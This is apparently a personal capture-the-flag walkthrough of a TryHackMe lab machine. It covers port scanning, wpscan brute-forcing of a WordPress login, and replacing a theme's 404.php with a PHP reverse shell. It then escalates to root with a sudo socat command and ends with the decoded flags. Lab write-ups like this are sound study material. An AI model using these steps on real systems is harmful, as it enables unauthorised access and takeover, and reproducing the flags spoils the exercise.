### Nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.24.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
|_  256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


### HTTP

- ffuf gives 
```
/wordpress
/hackathons
```

- `/hackathons` included this in comments 
```
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

Maybe some kind of credentials


- Found login at `http://10.10.188.209/wordpress/wp-login.php` but above creds are not working in ssh, ftp and wp-login
- wpscan also gives nothing interesting
```
─[glack@parrot]─[~/Desktop/THM/All_in_one]
└──╼ $wpscan --url http://10.10.188.209/wordpress/
```

maybe this 

```
Upload directory has listing enabled: http://10.10.188.209/wordpress/wp-content/uploads/
```


- Found one username at 
```
## Archives

- [October 2020](http://10.10.188.209/wordpress/index.php/2020/10/)
```

`By [elyana](http://10.10.188.209/wordpress/index.php/author/elyana/)`


- When trying to login as `elyana` with pass ``
`pasfaw` we get this error 

```
**Error**: The password you entered for the username **elyana** is incorrect.
```

- Stopped this after 17 minutes
```
─[glack@parrot]─[~/Desktop/THM/All_in_one]
└──╼ $wpscan --url http://10.10.188.209/wordpress/ --usernames elyana --passwords /usr/share/wordlists/rockyou.txt
```

- this found nothing

```
┌─[glack@parrot]─[~/Desktop/THM/All_in_one]
└──╼ $wpscan --url http://10.10.188.209/wordpress/ --usernames elyana --passwords /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```

- will continue this tomorrow

- Trying the following combinations in /wp-login.php
```
username - elyana
pass- Dvc, W@iyur@123, KeepGoing

```

- Got fed up and used the writeup here

so turns out `/hackathons ` comment text was a vignere encoded text and Vinegar was an hint for this.

- Used `https://www.boxentriq.com/code-breaking/vigenere-cipher` site to decode the text 

![[Pasted image 20230829030019.png]]

we get 

`Try H@ckme@123`

- Now we are able to log in as 

```
elyana

H@ckme@123
```

closed the write up here


- after logging in i changed the content of `404.php` to pentest php reverse shell
`http://10.10.95.207/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty`


- start a reverse netcat listener
and generated an error using 

`http://10.10.95.207/wordpress/index.php/2019/10/` <changed 2020 to 2019>

and i get a shell as 
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Priv Esc

- After loggin in i tried to switch user to elyana but it gave me Authentication failure

- there was a hint file in elyana's home directory
```
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

- A hint to use the find command maybe?
 tried few `find` but this one found me something intereting
```
bash-4.4$ find / -type f -user elyana -ls 2>/dev/null


   291777      4 -rwxrwxrwx   1 elyana   elyana         34 Oct  5  2020 /etc/mysql/conf.d/private.txt
```

in the file contents we find the creds of elyana

```
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```

```
bash-4.4$ id
id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
```

- Now on the way to root
i see [[lxd - priv esc]] option also available since it is showing in the id


- We are also able to run this command as sudo
```
(ALL) NOPASSWD: /usr/bin/socat
```

`https://gtfobins.github.io/gtfobins/socat/#sudo`

````
sudo socat stdin exec:/bin/sh
````


- We easily get root

```
id
uid=0(root) gid=0(root) groups=0(root)
```

- The flags

```
cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9


cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```


the flags are base64 encoded

```
`For root`
echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}


For user
echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}

```

